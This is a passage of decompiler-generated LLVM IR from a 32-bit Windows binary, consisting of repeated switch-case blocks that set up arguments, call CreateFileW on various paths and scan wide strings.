  %575 = add i32 %esp.3.reload, -20, !insn.addr !1090
  %576 = inttoptr i32 %575 to i32*, !insn.addr !1090
  store i32 1, i32* %576, align 4, !insn.addr !1090
  %577 = add i32 %esp.3.reload, -24, !insn.addr !1091
  %578 = inttoptr i32 %577 to i32*, !insn.addr !1091
  store i32 4, i32* %578, align 4, !insn.addr !1091
  %579 = add i32 %esp.3.reload, -28, !insn.addr !1092
  %580 = inttoptr i32 %579 to i32*, !insn.addr !1092
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %580, align 4, !insn.addr !1092
  %581 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1093
  %582 = ptrtoint i32* %581 to i32, !insn.addr !1093
  %583 = add i32 %esp.3.reload, -32, !insn.addr !1094
  %584 = inttoptr i32 %583 to i32*, !insn.addr !1094
  store i32 0, i32* %584, align 4, !insn.addr !1094
  %585 = add i32 %esp.3.reload, -36, !insn.addr !1095
  %586 = inttoptr i32 %585 to i32*, !insn.addr !1095
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %586, align 4, !insn.addr !1095
  %587 = add i32 %esp.3.reload, -40, !insn.addr !1096
  %588 = inttoptr i32 %587 to i32*, !insn.addr !1096
  store i32 2, i32* %588, align 4, !insn.addr !1096
  %589 = add i32 %esp.3.reload, -44, !insn.addr !1097
  %590 = inttoptr i32 %589 to i32*, !insn.addr !1097
  store i32 ptrtoint (i32* @global_var_10039284 to i32), i32* %590, align 4, !insn.addr !1097
  store i32 %582, i32* @global_var_1003d9b0, align 4, !insn.addr !1098
  %591 = add i32 %esp.3.reload, -48, !insn.addr !1099
  %592 = inttoptr i32 %591 to i32*, !insn.addr !1099
  store i32 %582, i32* %592, align 4, !insn.addr !1099
  store i32 %591, i32* %esp.5.reg2mem, !insn.addr !1100
  br label %dec_label_pc_10002dc5, !insn.addr !1100

dec_label_pc_10002a37:                            ; preds = %dec_label_pc_100025b4
  %593 = add i32 %esp.3.reload, -4, !insn.addr !1101
  %594 = inttoptr i32 %593 to i32*, !insn.addr !1101
  store i32 0, i32* %594, align 4, !insn.addr !1101
  %595 = add i32 %esp.3.reload, -8, !insn.addr !1102
  %596 = inttoptr i32 %595 to i32*, !insn.addr !1102
  store i32 128, i32* %596, align 4, !insn.addr !1102
  %597 = add i32 %esp.3.reload, -12, !insn.addr !1103
  %598 = inttoptr i32 %597 to i32*, !insn.addr !1103
  store i32 4, i32* %598, align 4, !insn.addr !1103
  %599 = add i32 %esp.3.reload, -16, !insn.addr !1104
  %600 = inttoptr i32 %599 to i32*, !insn.addr !1104
  store i32 0, i32* %600, align 4, !insn.addr !1104
  %601 = add i32 %esp.3.reload, -20, !insn.addr !1105
  %602 = inttoptr i32 %601 to i32*, !insn.addr !1105
  store i32 1, i32* %602, align 4, !insn.addr !1105
  %603 = add i32 %esp.3.reload, -24, !insn.addr !1106
  %604 = inttoptr i32 %603 to i32*, !insn.addr !1106
  store i32 4, i32* %604, align 4, !insn.addr !1106
  %605 = add i32 %esp.3.reload, -28, !insn.addr !1107
  %606 = inttoptr i32 %605 to i32*, !insn.addr !1107
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %606, align 4, !insn.addr !1107
  %607 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1108
  %608 = ptrtoint i32* %607 to i32, !insn.addr !1108
  %609 = add i32 %esp.3.reload, -32, !insn.addr !1109
  %610 = inttoptr i32 %609 to i32*, !insn.addr !1109
  store i32 0, i32* %610, align 4, !insn.addr !1109
  %611 = add i32 %esp.3.reload, -36, !insn.addr !1110
  %612 = inttoptr i32 %611 to i32*, !insn.addr !1110
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %612, align 4, !insn.addr !1110
  %613 = add i32 %esp.3.reload, -40, !insn.addr !1111
  %614 = inttoptr i32 %613 to i32*, !insn.addr !1111
  store i32 2, i32* %614, align 4, !insn.addr !1111
  %615 = add i32 %esp.3.reload, -44, !insn.addr !1112
  %616 = inttoptr i32 %615 to i32*, !insn.addr !1112
  store i32 ptrtoint (i32* @global_var_10039288 to i32), i32* %616, align 4, !insn.addr !1112
  store i32 %608, i32* @global_var_1003d9b0, align 4, !insn.addr !1113
  %617 = add i32 %esp.3.reload, -48, !insn.addr !1114
  %618 = inttoptr i32 %617 to i32*, !insn.addr !1114
  store i32 %608, i32* %618, align 4, !insn.addr !1114
  store i32 %617, i32* %esp.5.reg2mem, !insn.addr !1115
  br label %dec_label_pc_10002dc5, !insn.addr !1115

dec_label_pc_10002a66:                            ; preds = %dec_label_pc_100025b4
  %619 = add i32 %esp.3.reload, -4, !insn.addr !1116
  %620 = inttoptr i32 %619 to i32*, !insn.addr !1116
  store i32 0, i32* %620, align 4, !insn.addr !1116
  %621 = add i32 %esp.3.reload, -8, !insn.addr !1117
  %622 = inttoptr i32 %621 to i32*, !insn.addr !1117
  store i32 128, i32* %622, align 4, !insn.addr !1117
  %623 = add i32 %esp.3.reload, -12, !insn.addr !1118
  %624 = inttoptr i32 %623 to i32*, !insn.addr !1118
  store i32 4, i32* %624, align 4, !insn.addr !1118
  %625 = add i32 %esp.3.reload, -16, !insn.addr !1119
  %626 = inttoptr i32 %625 to i32*, !insn.addr !1119
  store i32 0, i32* %626, align 4, !insn.addr !1119
  %627 = add i32 %esp.3.reload, -20, !insn.addr !1120
  %628 = inttoptr i32 %627 to i32*, !insn.addr !1120
  store i32 1, i32* %628, align 4, !insn.addr !1120
  %629 = add i32 %esp.3.reload, -24, !insn.addr !1121
  %630 = inttoptr i32 %629 to i32*, !insn.addr !1121
  store i32 4, i32* %630, align 4, !insn.addr !1121
  %631 = add i32 %esp.3.reload, -28, !insn.addr !1122
  %632 = inttoptr i32 %631 to i32*, !insn.addr !1122
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %632, align 4, !insn.addr !1122
  %633 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1123
  %634 = ptrtoint i32* %633 to i32, !insn.addr !1123
  %635 = add i32 %esp.3.reload, -32, !insn.addr !1124
  %636 = inttoptr i32 %635 to i32*, !insn.addr !1124
  store i32 0, i32* %636, align 4, !insn.addr !1124
  %637 = add i32 %esp.3.reload, -36, !insn.addr !1125
  %638 = inttoptr i32 %637 to i32*, !insn.addr !1125
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %638, align 4, !insn.addr !1125
  %639 = add i32 %esp.3.reload, -40, !insn.addr !1126
  %640 = inttoptr i32 %639 to i32*, !insn.addr !1126
  store i32 2, i32* %640, align 4, !insn.addr !1126
  %641 = add i32 %esp.3.reload, -44, !insn.addr !1127
  %642 = inttoptr i32 %641 to i32*, !insn.addr !1127
  store i32 ptrtoint (i32* @global_var_1003928c to i32), i32* %642, align 4, !insn.addr !1127
  store i32 %634, i32* @global_var_1003d9b0, align 4, !insn.addr !1128
  %643 = add i32 %esp.3.reload, -48, !insn.addr !1129
  %644 = inttoptr i32 %643 to i32*, !insn.addr !1129
  store i32 %634, i32* %644, align 4, !insn.addr !1129
  store i32 %643, i32* %esp.5.reg2mem, !insn.addr !1130
  br label %dec_label_pc_10002dc5, !insn.addr !1130

dec_label_pc_10002a95:                            ; preds = %dec_label_pc_100025b4
  %645 = add i32 %esp.3.reload, -4, !insn.addr !1131
  %646 = inttoptr i32 %645 to i32*, !insn.addr !1131
  store i32 0, i32* %646, align 4, !insn.addr !1131
  %647 = add i32 %esp.3.reload, -8, !insn.addr !1132
  %648 = inttoptr i32 %647 to i32*, !insn.addr !1132
  store i32 128, i32* %648, align 4, !insn.addr !1132
  %649 = add i32 %esp.3.reload, -12, !insn.addr !1133
  %650 = inttoptr i32 %649 to i32*, !insn.addr !1133
  store i32 4, i32* %650, align 4, !insn.addr !1133
  %651 = add i32 %esp.3.reload, -16, !insn.addr !1134
  %652 = inttoptr i32 %651 to i32*, !insn.addr !1134
  store i32 0, i32* %652, align 4, !insn.addr !1134
  %653 = add i32 %esp.3.reload, -20, !insn.addr !1135
  %654 = inttoptr i32 %653 to i32*, !insn.addr !1135
  store i32 1, i32* %654, align 4, !insn.addr !1135
  %655 = add i32 %esp.3.reload, -24, !insn.addr !1136
  %656 = inttoptr i32 %655 to i32*, !insn.addr !1136
  store i32 4, i32* %656, align 4, !insn.addr !1136
  %657 = add i32 %esp.3.reload, -28, !insn.addr !1137
  %658 = inttoptr i32 %657 to i32*, !insn.addr !1137
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %658, align 4, !insn.addr !1137
  %659 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1138
  %660 = ptrtoint i32* %659 to i32, !insn.addr !1138
  %661 = add i32 %esp.3.reload, -32, !insn.addr !1139
  %662 = inttoptr i32 %661 to i32*, !insn.addr !1139
  store i32 0, i32* %662, align 4, !insn.addr !1139
  %663 = add i32 %esp.3.reload, -36, !insn.addr !1140
  %664 = inttoptr i32 %663 to i32*, !insn.addr !1140
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %664, align 4, !insn.addr !1140
  %665 = add i32 %esp.3.reload, -40, !insn.addr !1141
  %666 = inttoptr i32 %665 to i32*, !insn.addr !1141
  store i32 2, i32* %666, align 4, !insn.addr !1141
  %667 = add i32 %esp.3.reload, -44, !insn.addr !1142
  %668 = inttoptr i32 %667 to i32*, !insn.addr !1142
  store i32 ptrtoint (i32* @global_var_10039290 to i32), i32* %668, align 4, !insn.addr !1142
  store i32 %660, i32* @global_var_1003d9b0, align 4, !insn.addr !1143
  %669 = add i32 %esp.3.reload, -48, !insn.addr !1144
  %670 = inttoptr i32 %669 to i32*, !insn.addr !1144
  store i32 %660, i32* %670, align 4, !insn.addr !1144
  store i32 %669, i32* %esp.5.reg2mem, !insn.addr !1145
  br label %dec_label_pc_10002dc5, !insn.addr !1145

dec_label_pc_10002ac4:                            ; preds = %dec_label_pc_100025b4
  %671 = add i32 %esp.3.reload, -4, !insn.addr !1146
  %672 = inttoptr i32 %671 to i32*, !insn.addr !1146
  store i32 0, i32* %672, align 4, !insn.addr !1146
  %673 = add i32 %esp.3.reload, -8, !insn.addr !1147
  %674 = inttoptr i32 %673 to i32*, !insn.addr !1147
  store i32 128, i32* %674, align 4, !insn.addr !1147
  %675 = add i32 %esp.3.reload, -12, !insn.addr !1148
  %676 = inttoptr i32 %675 to i32*, !insn.addr !1148
  store i32 4, i32* %676, align 4, !insn.addr !1148
  %677 = add i32 %esp.3.reload, -16, !insn.addr !1149
  %678 = inttoptr i32 %677 to i32*, !insn.addr !1149
  store i32 0, i32* %678, align 4, !insn.addr !1149
  %679 = add i32 %esp.3.reload, -20, !insn.addr !1150
  %680 = inttoptr i32 %679 to i32*, !insn.addr !1150
  store i32 1, i32* %680, align 4, !insn.addr !1150
  %681 = add i32 %esp.3.reload, -24, !insn.addr !1151
  %682 = inttoptr i32 %681 to i32*, !insn.addr !1151
  store i32 4, i32* %682, align 4, !insn.addr !1151
  %683 = add i32 %esp.3.reload, -28, !insn.addr !1152
  %684 = inttoptr i32 %683 to i32*, !insn.addr !1152
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %684, align 4, !insn.addr !1152
  %685 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1153
  %686 = ptrtoint i32* %685 to i32, !insn.addr !1153
  %687 = add i32 %esp.3.reload, -32, !insn.addr !1154
  %688 = inttoptr i32 %687 to i32*, !insn.addr !1154
  store i32 0, i32* %688, align 4, !insn.addr !1154
  %689 = add i32 %esp.3.reload, -36, !insn.addr !1155
  %690 = inttoptr i32 %689 to i32*, !insn.addr !1155
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %690, align 4, !insn.addr !1155
  %691 = add i32 %esp.3.reload, -40, !insn.addr !1156
  %692 = inttoptr i32 %691 to i32*, !insn.addr !1156
  store i32 2, i32* %692, align 4, !insn.addr !1156
  %693 = add i32 %esp.3.reload, -44, !insn.addr !1157
  %694 = inttoptr i32 %693 to i32*, !insn.addr !1157
  store i32 ptrtoint (i32* @global_var_10039294 to i32), i32* %694, align 4, !insn.addr !1157
  store i32 %686, i32* @global_var_1003d9b0, align 4, !insn.addr !1158
  %695 = add i32 %esp.3.reload, -48, !insn.addr !1159
  %696 = inttoptr i32 %695 to i32*, !insn.addr !1159
  store i32 %686, i32* %696, align 4, !insn.addr !1159
  store i32 %695, i32* %esp.5.reg2mem, !insn.addr !1160
  br label %dec_label_pc_10002dc5, !insn.addr !1160

dec_label_pc_10002af3:                            ; preds = %dec_label_pc_100025b4, %dec_label_pc_100025b4
  %697 = call i128 @__asm_movaps(i128 %39), !insn.addr !1161
  %698 = add i32 %esp.3.reload, -4, !insn.addr !1162
  %699 = inttoptr i32 %698 to i32*, !insn.addr !1162
  store i32 0, i32* %699, align 4, !insn.addr !1162
  %700 = add i32 %esp.3.reload, -8, !insn.addr !1163
  %701 = inttoptr i32 %700 to i32*, !insn.addr !1163
  store i32 128, i32* %701, align 4, !insn.addr !1163
  %702 = add i32 %esp.3.reload, -12, !insn.addr !1164
  %703 = inttoptr i32 %702 to i32*, !insn.addr !1164
  store i32 4, i32* %703, align 4, !insn.addr !1164
  %704 = add i32 %esp.3.reload, -16, !insn.addr !1165
  %705 = inttoptr i32 %704 to i32*, !insn.addr !1165
  store i32 0, i32* %705, align 4, !insn.addr !1165
  %706 = add i32 %esp.3.reload, -20, !insn.addr !1166
  %707 = inttoptr i32 %706 to i32*, !insn.addr !1166
  store i32 1, i32* %707, align 4, !insn.addr !1166
  %708 = add i32 %esp.3.reload, -24, !insn.addr !1167
  %709 = inttoptr i32 %708 to i32*, !insn.addr !1167
  store i32 4, i32* %709, align 4, !insn.addr !1167
  %710 = add i32 %esp.3.reload, -28, !insn.addr !1168
  %711 = inttoptr i32 %710 to i32*, !insn.addr !1168
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %711, align 4, !insn.addr !1168
  %712 = load i128, i128* %stack_var_-108, align 8, !insn.addr !1169
  call void @__asm_movups(i128 %712, i128 %697), !insn.addr !1169
  %713 = call i32* @CreateFileW(i16* inttoptr (i32 4915267 to i16*), i32 93, i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1170
  %714 = ptrtoint i32* %713 to i32, !insn.addr !1170
  store i32 %714, i32* @global_var_1003d9b0, align 4, !insn.addr !1171
  store i32 %34, i32* %ecx.9.reg2mem, !insn.addr !1172
  br label %dec_label_pc_10002b36, !insn.addr !1172

dec_label_pc_10002b36:                            ; preds = %dec_label_pc_10002b36, %dec_label_pc_10002af3
  %ecx.9.reload = load i32, i32* %ecx.9.reg2mem
  %715 = inttoptr i32 %ecx.9.reload to i16*, !insn.addr !1173
  %716 = load i16, i16* %715, align 2, !insn.addr !1173
  %717 = add i32 %ecx.9.reload, 2, !insn.addr !1174
  %718 = icmp eq i16 %716, 0, !insn.addr !1175
  %719 = icmp eq i1 %718, false, !insn.addr !1176
  store i32 %717, i32* %ecx.9.reg2mem, !insn.addr !1176
  store i32 %717, i32* %.pn.reg2mem, !insn.addr !1176
  store i32 %714, i32* %edx.6.reg2mem, !insn.addr !1176
  store i32 %710, i32* %esp.4.reg2mem, !insn.addr !1176
  br i1 %719, label %dec_label_pc_10002b36, label %dec_label_pc_10002db3, !insn.addr !1176

dec_label_pc_10002b4c:                            ; preds = %dec_label_pc_100025b4
  %720 = call i128 @__asm_movaps(i128 %37), !insn.addr !1177
  %721 = add i32 %esp.3.reload, -4, !insn.addr !1178
  %722 = inttoptr i32 %721 to i32*, !insn.addr !1178
  store i32 0, i32* %722, align 4, !insn.addr !1178
  %723 = add i32 %esp.3.reload, -8, !insn.addr !1179
  %724 = inttoptr i32 %723 to i32*, !insn.addr !1179
  store i32 128, i32* %724, align 4, !insn.addr !1179
  %725 = add i32 %esp.3.reload, -12, !insn.addr !1180
  %726 = inttoptr i32 %725 to i32*, !insn.addr !1180
  store i32 4, i32* %726, align 4, !insn.addr !1180
  %727 = add i32 %esp.3.reload, -16, !insn.addr !1181
  %728 = inttoptr i32 %727 to i32*, !insn.addr !1181
  store i32 0, i32* %728, align 4, !insn.addr !1181
  %729 = add i32 %esp.3.reload, -20, !insn.addr !1182
  %730 = inttoptr i32 %729 to i32*, !insn.addr !1182
  store i32 1, i32* %730, align 4, !insn.addr !1182
  %731 = add i32 %esp.3.reload, -24, !insn.addr !1183
  %732 = inttoptr i32 %731 to i32*, !insn.addr !1183
  store i32 4, i32* %732, align 4, !insn.addr !1183
  %733 = add i32 %esp.3.reload, -28, !insn.addr !1184
  %734 = inttoptr i32 %733 to i32*, !insn.addr !1184
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %734, align 4, !insn.addr !1184
  %735 = load i128, i128* %stack_var_-108, align 8, !insn.addr !1185
  call void @__asm_movups(i128 %735, i128 %720), !insn.addr !1185
  %736 = call i32* @CreateFileW(i16* inttoptr (i32 93 to i16*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1186
  %737 = ptrtoint i32* %736 to i32, !insn.addr !1186
  store i32 %737, i32* @global_var_1003d9b0, align 4, !insn.addr !1187
  store i32 %34, i32* %ecx.10.reg2mem, !insn.addr !1188
  br label %dec_label_pc_10002b90, !insn.addr !1188

dec_label_pc_10002b90:                            ; preds = %dec_label_pc_10002b90, %dec_label_pc_10002b4c
  %ecx.10.reload = load i32, i32* %ecx.10.reg2mem
  %738 = inttoptr i32 %ecx.10.reload to i16*, !insn.addr !1189
  %739 = load i16, i16* %738, align 2, !insn.addr !1189
  %740 = add i32 %ecx.10.reload, 2, !insn.addr !1190
  %741 = icmp eq i16 %739, 0, !insn.addr !1191
  %742 = icmp eq i1 %741, false, !insn.addr !1192
  store i32 %740, i32* %ecx.10.reg2mem, !insn.addr !1192
  store i32 %740, i32* %.pn.reg2mem, !insn.addr !1192
  store i32 %737, i32* %edx.6.reg2mem, !insn.addr !1192
  store i32 %733, i32* %esp.4.reg2mem, !insn.addr !1192
  br i1 %742, label %dec_label_pc_10002b90, label %dec_label_pc_10002db3, !insn.addr !1192

dec_label_pc_10002ba6:                            ; preds = %dec_label_pc_100025b4
  %743 = call i128 @__asm_movaps(i128 %36), !insn.addr !1193
  %744 = add i32 %esp.3.reload, -4, !insn.addr !1194
  %745 = inttoptr i32 %744 to i32*, !insn.addr !1194
  store i32 0, i32* %745, align 4, !insn.addr !1194
  %746 = add i32 %esp.3.reload, -8, !insn.addr !1195
  %747 = inttoptr i32 %746 to i32*, !insn.addr !1195
  store i32 128, i32* %747, align 4, !insn.addr !1195
  %748 = add i32 %esp.3.reload, -12, !insn.addr !1196
  %749 = inttoptr i32 %748 to i32*, !insn.addr !1196
  store i32 4, i32* %749, align 4, !insn.addr !1196
  %750 = add i32 %esp.3.reload, -16, !insn.addr !1197
  %751 = inttoptr i32 %750 to i32*, !insn.addr !1197
  store i32 0, i32* %751, align 4, !insn.addr !1197
  %752 = add i32 %esp.3.reload, -20, !insn.addr !1198
  %753 = inttoptr i32 %752 to i32*, !insn.addr !1198
  store i32 1, i32* %753, align 4, !insn.addr !1198
  %754 = add i32 %esp.3.reload, -24, !insn.addr !1199
  %755 = inttoptr i32 %754 to i32*, !insn.addr !1199
  store i32 4, i32* %755, align 4, !insn.addr !1199
  %756 = add i32 %esp.3.reload, -28, !insn.addr !1200
  %757 = inttoptr i32 %756 to i32*, !insn.addr !1200
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %757, align 4, !insn.addr !1200
  %758 = load i128, i128* %stack_var_-108, align 8, !insn.addr !1201
  call void @__asm_movups(i128 %758, i128 %743), !insn.addr !1201
  %759 = call i32* @CreateFileW(i16* inttoptr (i32 5111895 to i16*), i32 93, i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1202
  %760 = ptrtoint i32* %759 to i32, !insn.addr !1202
  store i32 %760, i32* @global_var_1003d9b0, align 4, !insn.addr !1203
  store i32 %34, i32* %ecx.11.reg2mem, !insn.addr !1204
  br label %dec_label_pc_10002bf0, !insn.addr !1204

dec_label_pc_10002bf0:                            ; preds = %dec_label_pc_10002bf0, %dec_label_pc_10002ba6
  %ecx.11.reload = load i32, i32* %ecx.11.reg2mem
  %761 = inttoptr i32 %ecx.11.reload to i16*, !insn.addr !1205
  %762 = load i16, i16* %761, align 2, !insn.addr !1205
  %763 = add i32 %ecx.11.reload, 2, !insn.addr !1206
  %764 = icmp eq i16 %762, 0, !insn.addr !1207
  %765 = icmp eq i1 %764, false, !insn.addr !1208
  store i32 %763, i32* %ecx.11.reg2mem, !insn.addr !1208
  store i32 %763, i32* %.pn.reg2mem, !insn.addr !1208
  store i32 %760, i32* %edx.6.reg2mem, !insn.addr !1208
  store i32 %756, i32* %esp.4.reg2mem, !insn.addr !1208
  br i1 %765, label %dec_label_pc_10002bf0, label %dec_label_pc_10002db3, !insn.addr !1208

dec_label_pc_10002c06:                            ; preds = %dec_label_pc_100025b4
  %766 = add i32 %esp.3.reload, -4, !insn.addr !1209
  %767 = inttoptr i32 %766 to i32*, !insn.addr !1209
  store i32 0, i32* %767, align 4, !insn.addr !1209
  %768 = add i32 %esp.3.reload, -8, !insn.addr !1210
  %769 = inttoptr i32 %768 to i32*, !insn.addr !1210
  store i32 128, i32* %769, align 4, !insn.addr !1210
  %770 = add i32 %esp.3.reload, -12, !insn.addr !1211
  %771 = inttoptr i32 %770 to i32*, !insn.addr !1211
  store i32 4, i32* %771, align 4, !insn.addr !1211
  %772 = add i32 %esp.3.reload, -16, !insn.addr !1212
  %773 = inttoptr i32 %772 to i32*, !insn.addr !1212
  store i32 0, i32* %773, align 4, !insn.addr !1212
  %774 = add i32 %esp.3.reload, -20, !insn.addr !1213
  %775 = inttoptr i32 %774 to i32*, !insn.addr !1213
  store i32 1, i32* %775, align 4, !insn.addr !1213
  %776 = add i32 %esp.3.reload, -24, !insn.addr !1214
  %777 = inttoptr i32 %776 to i32*, !insn.addr !1214
  store i32 4, i32* %777, align 4, !insn.addr !1214
  %778 = add i32 %esp.3.reload, -28, !insn.addr !1215
  %779 = inttoptr i32 %778 to i32*, !insn.addr !1215
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %779, align 4, !insn.addr !1215
  store i128 4522075, i128* %stack_var_-108, align 8, !insn.addr !1216
  %780 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1217
  %781 = ptrtoint i32* %780 to i32, !insn.addr !1217
  store i32 %781, i32* @global_var_1003d9b0, align 4, !insn.addr !1218
  store i32 %34, i32* %ecx.12.reg2mem, !insn.addr !1219
  br label %dec_label_pc_10002c45, !insn.addr !1219

dec_label_pc_10002c45:                            ; preds = %dec_label_pc_10002c45, %dec_label_pc_10002c06
  %ecx.12.reload = load i32, i32* %ecx.12.reg2mem
  %782 = inttoptr i32 %ecx.12.reload to i16*, !insn.addr !1220
  %783 = load i16, i16* %782, align 2, !insn.addr !1220
  %784 = add i32 %ecx.12.reload, 2, !insn.addr !1221
  %785 = icmp eq i16 %783, 0, !insn.addr !1222
  %786 = icmp eq i1 %785, false, !insn.addr !1223
  store i32 %784, i32* %ecx.12.reg2mem, !insn.addr !1223
  store i32 %784, i32* %.pn.reg2mem, !insn.addr !1223
  store i32 %781, i32* %edx.6.reg2mem, !insn.addr !1223
  store i32 %778, i32* %esp.4.reg2mem, !insn.addr !1223
  br i1 %786, label %dec_label_pc_10002c45, label %dec_label_pc_10002db3, !insn.addr !1223

dec_label_pc_10002c5b:                            ; preds = %dec_label_pc_100025b4
  %787 = add i32 %esp.3.reload, -4, !insn.addr !1224
  %788 = inttoptr i32 %787 to i32*, !insn.addr !1224
  store i32 0, i32* %788, align 4, !insn.addr !1224
  %789 = add i32 %esp.3.reload, -8, !insn.addr !1225
  %790 = inttoptr i32 %789 to i32*, !insn.addr !1225
  store i32 128, i32* %790, align 4, !insn.addr !1225
  %791 = add i32 %esp.3.reload, -12, !insn.addr !1226
  %792 = inttoptr i32 %791 to i32*, !insn.addr !1226
  store i32 4, i32* %792, align 4, !insn.addr !1226
  %793 = add i32 %esp.3.reload, -16, !insn.addr !1227
  %794 = inttoptr i32 %793 to i32*, !insn.addr !1227
  store i32 0, i32* %794, align 4, !insn.addr !1227
  %795 = add i32 %esp.3.reload, -20, !insn.addr !1228
  %796 = inttoptr i32 %795 to i32*, !insn.addr !1228
  store i32 1, i32* %796, align 4, !insn.addr !1228
  %797 = add i32 %esp.3.reload, -24, !insn.addr !1229
  %798 = inttoptr i32 %797 to i32*, !insn.addr !1229
  store i32 4, i32* %798, align 4, !insn.addr !1229
  %799 = add i32 %esp.3.reload, -28, !insn.addr !1230
  %800 = inttoptr i32 %799 to i32*, !insn.addr !1230
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %800, align 4, !insn.addr !1230
  store i128 4718683, i128* %stack_var_-108, align 8, !insn.addr !1231
  %801 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1232
  %802 = ptrtoint i32* %801 to i32, !insn.addr !1232
  store i32 %802, i32* @global_var_1003d9b0, align 4, !insn.addr !1233
  store i32 %34, i32* %ecx.13.reg2mem, !insn.addr !1234
  br label %dec_label_pc_10002ca0, !insn.addr !1234

dec_label_pc_10002ca0:                            ; preds = %dec_label_pc_10002ca0, %dec_label_pc_10002c5b
  %ecx.13.reload = load i32, i32* %ecx.13.reg2mem
  %803 = inttoptr i32 %ecx.13.reload to i16*, !insn.addr !1235
  %804 = load i16, i16* %803, align 2, !insn.addr !1235
  %805 = add i32 %ecx.13.reload, 2, !insn.addr !1236
  %806 = icmp eq i16 %804, 0, !insn.addr !1237
  %807 = icmp eq i1 %806, false, !insn.addr !1238
  store i32 %805, i32* %ecx.13.reg2mem, !insn.addr !1238
  store i32 %805, i32* %.pn.reg2mem, !insn.addr !1238
  store i32 %802, i32* %edx.6.reg2mem, !insn.addr !1238
  store i32 %799, i32* %esp.4.reg2mem, !insn.addr !1238
  br i1 %807, label %dec_label_pc_10002ca0, label %dec_label_pc_10002db3, !insn.addr !1238

dec_label_pc_10002cb6:                            ; preds = %dec_label_pc_100025b4
  %808 = add i32 %esp.3.reload, -4, !insn.addr !1239
  %809 = inttoptr i32 %808 to i32*, !insn.addr !1239
  store i32 0, i32* %809, align 4, !insn.addr !1239
  %810 = add i32 %esp.3.reload, -8, !insn.addr !1240
  %811 = inttoptr i32 %810 to i32*, !insn.addr !1240
  store i32 128, i32* %811, align 4, !insn.addr !1240
  %812 = add i32 %esp.3.reload, -12, !insn.addr !1241
  %813 = inttoptr i32 %812 to i32*, !insn.addr !1241
  store i32 4, i32* %813, align 4, !insn.addr !1241
  %814 = add i32 %esp.3.reload, -16, !insn.addr !1242
  %815 = inttoptr i32 %814 to i32*, !insn.addr !1242
  store i32 0, i32* %815, align 4, !insn.addr !1242
  %816 = add i32 %esp.3.reload, -20, !insn.addr !1243
  %817 = inttoptr i32 %816 to i32*, !insn.addr !1243
  store i32 1, i32* %817, align 4, !insn.addr !1243
  %818 = add i32 %esp.3.reload, -24, !insn.addr !1244
  %819 = inttoptr i32 %818 to i32*, !insn.addr !1244
  store i32 4, i32* %819, align 4, !insn.addr !1244
